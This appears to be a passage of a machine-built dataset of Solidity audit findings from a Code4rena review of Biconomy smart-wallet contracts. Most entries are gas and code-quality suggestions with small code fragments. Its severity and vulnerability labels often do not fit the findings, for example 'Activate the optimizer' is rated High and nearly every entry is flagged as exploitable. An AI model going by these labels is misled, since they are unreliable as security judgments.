    "code": "solidity\n2 results - 2 files\n\ncontracts/smart-contract-wallet/Proxy.sol:\n  15      constructor(address _implementation) {\n  16:          assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\n\ncontracts/smart-contract-wallet/common/Singleton.sol:\n  12      function _setImplementation(address _imp) internal {\n  13:         assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\n\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "[N-19] Use `require` instead of `assert`",
    "description": "2 results - 2 files contracts/smart-contract-wallet/Proxy.sol: 15      constructor(address _implementation) { 16:          assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1)); contracts/smart-contract-wallet/common/Singleton.sol:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 13,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.475,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n /**\n  * @notice Sends ERC20 tokens trapped in contract to external address\n  * @dev Onlyowner is allowed to make this function call\n  * @param account is the receiving address\n  * @param externalToken is the token being sent\n  * @param amount is the quantity being sent\n  * @return boolean value indicating whether the operation succeeded.\n  *\n */\n  function rescueERC20(address account, address externalToken, uint256 amount) public onlyOwner returns (bool) {\n    IERC20(externalToken).transfer(account, amount);\n    return true;\n  }\n}\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "Recommended Mitigation Steps",
    "description": "Add this code: /** * @notice Sends ERC20 tokens trapped in contract to external address * @dev Onlyowner is allowed to make this function call * @param account is the receiving address",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 17,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.548,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n10 results - 7 files\n\ncontracts/smart-contract-wallet/Proxy.sol:\n  11:     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x37722d148fb373b961a84120b6c8d209709b45377878a466db32bbc40d95af26;\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  25:      ISignatureValidatorConstants,\n  36:     string public constant VERSION = \"1.0.2\"; // using AA 0.3.0\n  42:     bytes32 internal constant DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;\n  48:     bytes32 internal constant ACCOUNT_TX_TYPEHASH = 0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07;\n\ncontracts/smart-contract-wallet/SmartAccountFactory.sol:\n  11:     string public constant VERSION = \"1.0.2\";\n\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol:\n  28:     address private constant SIMULATE_FIND_AGGREGATOR = address(1);\n\ncontracts/smart-contract-wallet/base/FallbackManager.sol:\n  12:     bytes32 internal constant FALLBACK_HANDLER_STORAGE_SLOT = 0x6c9a6c4a39284e37ed1cf53d337577d14212a4870fb976a4366c693b939918d5;\n\ncontracts/smart-contract-wallet/base/ModuleManager.sol:\n  16:     address internal constant SENTINEL_MODULES = address(0x1);\n\ncontracts/smart-contract-wallet/common/Singleton.sol:\n  10:     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x37722d148fb373b961a84120b6c8d209709b45377878a466db32bbc40d95af26;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "[N-22] Use a single file for all system-wide constants",
    "description": "There are many addresses and constants used in the system. It is recommended to put the most used ones in one file (for example constants.sol, use inheritance to access these values) This will help with readability and easier maintenance for future changes. This also helps with any issues, as some of these hard-coded values are admin addresses. constants.sol Use and import this file in contracts that require access to these values. This is just a suggestion, in some use cases this may result in higher gas usage in the distribution. 10 results - 7 files",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 28,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n72 results - 22 files\n\ncontracts/smart-contract-wallet/BaseSmartAccount.sol:\n  5: /* solhint-disable no-inline-assembly */\n\ncontracts/smart-contract-wallet/Proxy.sol:\n  17:          assembly {\n  24:         // solhint-disable-next-line no-inline-assembly\n  25:         assembly {\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  142:         // solhint-disable-next-line no-inline-assembly\n  143:         assembly {\n  329:                 // solhint-disable-next-line no-inline-assembly\n  330:                 assembly {\n  337:                 // solhint-disable-next-line no-inline-assembly\n  338:                 assembly {\n  480:             assembly {\n\ncontracts/smart-contract-wallet/SmartAccountFactory.sol:\n  36:         // solhint-disable-next-line no-inline-assembly\n  37:         assembly {\n  55:         // solhint-disable-next-line no-inline-assembly\n  56:         assembly {\n\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol:\n  142:         // solhint-disable-next-line no-inline-assembly\n  143:         assembly {\n  324:                 // solhint-disable-next-line no-inline-assembly\n  325:                 assembly {\n  332:                 // solhint-disable-next-line no-inline-assembly\n  333:                 assembly {\n  470:             assembly {\n\ncontracts/smart-contract-wallet/aa-4337/core/BaseAccount.sol:\n  5: /* solhint-disable no-inline-assembly */\n\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol:\n    9: /* solhint-disable no-inline-assembly */\n  501:         assembly {offset := data}\n  505:         assembly {data := offset}\n  512:         assembly {mstore(0, number())}\n\ncontracts/smart-contract-wallet/aa-4337/core/SenderCreator.sol:\n  19:         /* solhint-disable no-inline-assembly */\n  20:         assembly {\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol:\n  9: /* solhint-disable no-inline-assembly */\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol:\n   4: /* solhint-disable no-inline-assembly */\n  39:         assembly {data := calldataload(userOp)}\n  63:         assembly {\n\ncontracts/smart-contract-wallet/aa-4337/utils/Exec.sol:\n   4: // solhint-disable no-inline-assembly\n  14:         assembly {\n  24:         assembly {\n  34:         assembly {\n  41:         assembly {\n  52:         assembly {\n\ncontracts/smart-contract-wallet/base/Executor.sol:\n  21:             // solhint-disable-next-line no-inline-assembly\n  22:             assembly {\n  26:             // solhint-disable-next-line no-inline-assembly\n  27:             assembly {\n\ncontracts/smart-contract-wallet/base/FallbackManager.sol:\n  16:         // solhint-disable-next-line no-inline-assembly\n  17:         assembly {\n  34:         // solhint-disable-next-line no-inline-assembly\n  35:         assembly {\n\ncontracts/smart-contract-wallet/base/ModuleManager.sol:\n   87:         // solhint-disable-next-line no-inline-assembly\n   88:         assembly {\n  128:         // solhint-disable-next-line no-inline-assembly\n  129:         assembly {\n\ncontracts/smart-contract-wallet/common/SecuredTokenTransfer.sol:\n  18:         // solhint-disable-next-line no-inline-assembly\n  19:         assembly {\n\ncontracts/smart-contract-wallet/common/SignatureDecoder.sol:\n  22:         // solhint-disable-next-line no-inline-assembly\n  23:         assembly {\n\ncontracts/smart-contract-wallet/common/Singleton.sol:\n  14:         // solhint-disable-next-line no-inline-assembly\n  15:         assembly {\n  21:         // solhint-disable-next-line no-inline-assembly\n  22:         assembly {\n\ncontracts/smart-contract-wallet/libs/LibAddress.sol:\n  13:     // solhint-disable-next-line no-inline-assembly\n  14:     assembly { csize := extcodesize(account) }\n\ncontracts/smart-contract-wallet/libs/Math.sol:\n   66:             assembly {\n   86:             assembly {\n  100:             assembly {\n\ncontracts/smart-contract-wallet/libs/MultiSend.sol:\n  28:         // solhint-disable-next-line no-inline-assembly\n  29:         assembly {\n\ncontracts/smart-contract-wallet/libs/MultiSendCallOnly.sol:\n  22:         // solhint-disable-next-line no-inline-assembly\n  23:         assembly {\n\ncontracts/smart-contract-wallet/libs/Strings.sol:\n  23:             /// @solidity memory-safe-assembly\n  24:             assembly {\n  29:                 /// @solidity memory-safe-assembly\n  30:                 assembly {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[N-23] Assembly Codes Specific \u2013 Should Have Comments",
    "description": "Since this is a low level language that is more difficult to parse by readers, include extensive documentation, comments on the rationale behind its use, clearly explaining what each assembly instruction does This will make it easier for users to trust the code, for reviewers to validate the code, and for developers to build on or update the code. Note that using Aseembly removes several important security features of Solidity, which can make the code more insecure and more error-prone. 72 results - 22 files contracts/smart-contract-wallet/BaseSmartAccount.sol:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 120,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity=\nfunction multiSend(bytes calldata transactions) public payable {}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Recommended Mitigation Steps",
    "description": "Use calldata instead of memory for function arguments that do not get mutated because of lower gas fee. ex) before function multiSend(bytes memory transactions) public payable {} after",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.076,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity=\nbytes32 public constant VERSION = \"1.0.2\"; // using AA 0.3.0\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Recommended Mitigation Steps",
    "description": "USE bytes32 INSTEAD OF string because of lower gas fee. ex) before string public constant VERSION = \"1.0.2\"; // using AA 0.3.0 after",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.071,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "_requireFromEntryPointOrOwner",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "Redundant check in `execute` and `executeBatch` functions",
    "description": "Both function have a `onlyOwner` modifier that only allows the owner to execute the function. However, there's a redundant call to `_requireFromEntryPointOrOwner` in the body of both functions. https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L461 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L466",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.029,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\n*Note that mixing pragma is not recommended. Because different compiler versions have different meanings and behaviors, it also significantly raises maintenance costs. As a result, depending on the compiler version selected for any given file, deployed contracts may have security issues.*\n\nThe minimum required version must be [0.8.17](https://github.com/ethereum/solidity/releases/tag/v0.8.17); otherwise, contracts will be affected by the following **important bug fixes**:\n\n[0.8.13](https://blog.soliditylang.org/2022/03/16/solidity-0.8.13-release-announcement/):\n- Code Generator: Correctly encode literals used in ",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "**2. Mixing and Outdated compiler**",
    "description": "The pragma version used are: pragma solidity 0.8.12; *Note that mixing pragma is not recommended. Because different compiler versions have different meanings and behaviors, it also significantly raises maintenance costs. As a result, depending on the compiler version selected for any given file, deployed contracts may have security issues.* The minimum required version must be [0.8.17](https://github.com/ethereum/solidity/releases/tag/v0.8.17); otherwise, contracts will be affected by the following **important bug fixes**: [0.8.13](https://blog.soliditylang.org/2022/03/16/solidity-0.8.13-release-announcement/):",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.622,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "js\n    fallback() external payable {\n        address target;\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            target := sload(_IMPLEMENTATION_SLOT)\n            calldatacopy(0, 0, calldatasize())\n            let result := delegatecall(gas(), target, 0, calldatasize(), 0, 0)\n            returndatacopy(0, 0, returndatasize())\n            switch result\n            case 0 {revert(0, returndatasize())}\n            default {return (0, returndatasize())}\n        }\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "**6. Poxy isues**",
    "description": "There are a lack of checks during the constructor that allows an empty `_implementation`, `fallback` works with `target = address(0)` and the `receive` method does not call `target`, so tokens could be lost if it's called. fallback() external payable { address target; // solhint-disable-next-line no-inline-assembly assembly {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 15,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.505,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "Return the log in base 10, following the selected rounding direction, of a positive value.",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "**10. Wrong comment**",
    "description": "The contract `Math` has the following comment: `Return the log in base 10, following the selected rounding direction, of a positive value.` But this is not true, because is base 256 as was fixed in https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3916. **Affected source code:** - [Math.sol:336](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L336)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.09,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "0x000000000000000000000000000000000000000000000",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "**12. Unsafe low level call**",
    "description": "The following low level calls are insecure since they do not verify that the calling address is a contract and not an empty address or an EOA. For that reason, these methods are prone to [phantom methods](https://media.dedaub.com/phantom-functions-and-the-billion-dollar-no-op-c56f062ae49f) attacks. **Proof of Concept:** If you try to call the following methods with the following contract `0x000000000000000000000000000000000000000000000` (or any EOA) you can see that the transaction is successful, you have to check that the address is a valid contract and maybe check that the call returns a certain data. Otherwise it is possible to call it and lose tokens or produce undesired errors. This remind me to this attack https://certik.medium.com/qubit-bridge-collapse-exploited-to-the-tune-of-80-million-a7ab9068e1a0 where we can see: **Affected source code:**",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.047,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n550:     receive() external payable {}\n551: }\n\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol\n540:     receive() external payable {}\n541: }\n\nFile: scw-contracts/contracts/smart-contract-wallet/aa-4337/samples/SimpleAccount.sol\n41:     receive() external payable {}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Medium",
    "title": "#### Unused/empty `receive()/fallback()` function",
    "description": "If the intention is for the Ether to be used, the function should call another function, otherwise it should revert (e.g. require(msg.sender == address(weth))). Having no access control on the function means that someone may send Ether to the contract, and have no way to get anything back out, which is a loss of funds File: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol 550:     receive() external payable {} 551: } File: scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.371,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\n+    function _mixedAuth() private view {\n+        require(msg.sender == owner || msg.sender == address(this),\"Only owner or self\");\n+    }\n\n   modifier mixedAuth {\n-        require(msg.sender == owner || msg.sender == address(this),\"Only owner or self\");\n+        _mixedAuth();\n       _;\n   }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "## Private function with embedded modifier reduces contract size",
    "description": "Consider having the logic of a modifier embedded through a private function to reduce contract size if need be. A private visibility that saves more gas on function calls than the internal visibility is adopted because the modifier will only be making this call inside the contract. For instance, the modifier instance below may be refactored as follows just as it has been implemented in [SelfAuthorized.sol](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/common/SelfAuthorized.sol): [File: SmartAccount.sol#L82-L85](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L82-L85) +    function _mixedAuth() private view { +        require(msg.sender == owner || msg.sender == address(this),\"Only owner or self\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.299,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\n-              require(uint256(s) >= uint256(1) * 65, \"BSA021\");\n+              require(uint256(s) >= 65, \"BSA021\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Unneeded `uint256()` cast",
    "description": "Casting an unsigned integer to `uint256()` is unnecessary. For instance, the code line below may be refactored to save gas both on contract deployment and function call as follows: [File: SmartAccount.sol#L322](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L322) -              require(uint256(s) >= uint256(1) * 65, \"BSA021\"); +              require(uint256(s) >= 65, \"BSA021\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.122,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\n    function getNonce(uint256 batchId)\n    public view\n-    returns (uint256) {\n+    returns (uint256 _2dNonce) {\n-        return nonces[batchId];\n+        _2dNonce = nonces[batchId];\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Use of named returns for local variables saves gas",
    "description": "You can have further advantages in term of gas cost by simply using named return values as temporary local variable. For instance, the code block below may be refactored as follows: [File: SmartAccountNoAuth.sol#L155-L159](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol#L155-L159) function getNonce(uint256 batchId) public view",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.195,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "diff\n    function getModulesPaginated(address start, uint256 pageSize) external view returns (address[] memory array, address next) {\n        // Init array with max page size\n        array = new address[](pageSize);\n\n        // Populate return array\n        uint256 moduleCount = 0;\n        address currentModule = modules[start];\n+        require (currentModule != address(0x0), \"BSA105\"); // change to a different revert message where deemed fit\n-        while (currentModule != address(0x0) && currentModule != SENTINEL_MODULES && moduleCount < pageSize) {\n+        while (currentModule != SENTINEL_MODULES && moduleCount < pageSize) {\n            array[moduleCount] = currentModule;\n            currentModule = modules[currentModule];\n            moduleCount++;\n        }\n        next = currentModule;\n        // Set correct size of returned array\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            mstore(array, moduleCount)\n        }\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "logic_error",
    "severity": "Low",
    "title": "Check logic that could lead to waste of gas",
    "description": "In ModuleManager.sol, `getModulesPaginated()` has `currentModule != address(0x0)` included in the `while` statement. If `start` was inputted as a non-existent key, `(currentModule == address(0x0)`. This would skip the `while` loop and move on to executing the rest of the code lines while irrelevantly and meaninglessly returning the output. Consider separating the zero address check by having the function refactored as follows so that a revert could stem unneeded code executions coming after it: [File: ModuleManager.sol#L114-L132](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L114-L132) function getModulesPaginated(address start, uint256 pageSize) external view returns (address[] memory array, address next) { // Init array with max page size",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 23,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.982,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "diff\n-    function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {\n+    function transfer(address payable dest, uint amount) external payable nonReentrant onlyOwner {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Payable access control functions costs less gas",
    "description": "Consider marking functions with access control as `payable`. This will save 20 gas on each call by their respective permissible callers for not needing to have the compiler check for `msg.value`. For instance, the code line below may be refactored as follows: [File: SmartAccount.sol#L449](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L449) -    function transfer(address payable dest, uint amount) external nonReentrant onlyOwner { +    function transfer(address payable dest, uint amount) external payable nonReentrant onlyOwner {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.197,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\n-              require(uint256(s) >= uint256(1) * 65, \"BSA021\");\n+              require(uint256(s) > uint256(1) * 65 - 1, \"BSA021\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Non-strict inequalities are cheaper than strict ones",
    "description": "In the EVM, there is no opcode for non-strict inequalities (>=, <=) and two operations are performed (> + = or < + =). As an example, consider replacing `>=` with the strict counterpart `>` in the following inequality instance: [File: SmartAccount.sol#L322](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L322) -              require(uint256(s) >= uint256(1) * 65, \"BSA021\"); +              require(uint256(s) > uint256(1) * 65 - 1, \"BSA021\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.138,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "diff\n+    unchecked {\n            nonces[batchId]++;\n+    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Unchecked SafeMath saves gas",
    "description": "\"Checked\" math, which is default in ^0.8.0 is not free. The compiler will add some overflow checks, somehow similar to those implemented by `SafeMath`. While it is reasonable to expect these checks to be less expensive than the current `SafeMath`, one should keep in mind that these checks will increase the cost of \"basic math operation\" that were not previously covered. This particularly concerns variable increments in for loops. When no arithmetic overflow/underflow is going to happen, `unchecked { ... }` to use the previous wrapping behavior further saves gas just as in the instance below as an example: [File: SmartAccount.sol#L216](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L216) +    unchecked { nonces[batchId]++; +    }",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.06,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nPlease visit the following site for further information:\n\nhttps://docs.soliditylang.org/en/v0.5.4/using-the-compiler.html#using-the-commandline-compiler\n\nHere's one example of instance on opcode comparison that delineates the gas saving mechanism:\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "Activate the optimizer",
    "description": "Before deploying your contract, activate the optimizer when compiling using \u201csolc --optimize --bin sourceFile.sol\u201d. By default, the optimizer will optimize the contract assuming it is called 200 times across its lifetime. If you want the initial contract deployment to be cheaper and the later function executions to be more expensive, set it to \u201c --optimize-runs=1\u201d. Conversely, if you expect many transactions and do not care for higher deployment cost and output size, set \u201c--optimize-runs\u201d to a high number. module.exports = { solidity: { version: \"0.8.12\", settings: {",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.25,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\n-            collected += _executeUserOp(i, ops[i], opInfos[i]);\n+            collected = collected + _executeUserOp(i, ops[i], opInfos[i]);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "+= and -= cost more gas",
    "description": "`+=` and `-=` generally cost 22 more gas than writing out the assigned equation explicitly. The amount of gas wasted can be quite sizable when repeatedly operated in a loop. For instance, the `+=` instance below may be refactored as follows: [File: EntryPoint.sol#L81](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L81) -            collected += _executeUserOp(i, ops[i], opInfos[i]); +            collected = collected + _executeUserOp(i, ops[i], opInfos[i]);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.146,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n   for (uint256 i = 0; i < orders.length; /** NOTE: Removed i++ **/ ) {\n           // Do the thing\n           // Unchecked pre-increment is cheapest\n           unchecked { ++i; }   \n}  ",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "High",
    "title": "`++I/I++` SHOULD BE `UNCHECKED{++I}`/`UNCHECKED{I++}` WHEN IT IS NOT POSSIBLE FOR THEM TO OVERFLOW, AS IS THE CASE WHEN USED IN FOR- AND WHILE-LOOPS",
    "description": "The unchecked keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves 30-40 gas per loop ` for (uint256 i = 0; i < orders.length; /** NOTE: Removed i++ **/ ) { // Do the thing // Unchecked pre-increment is cheapest",
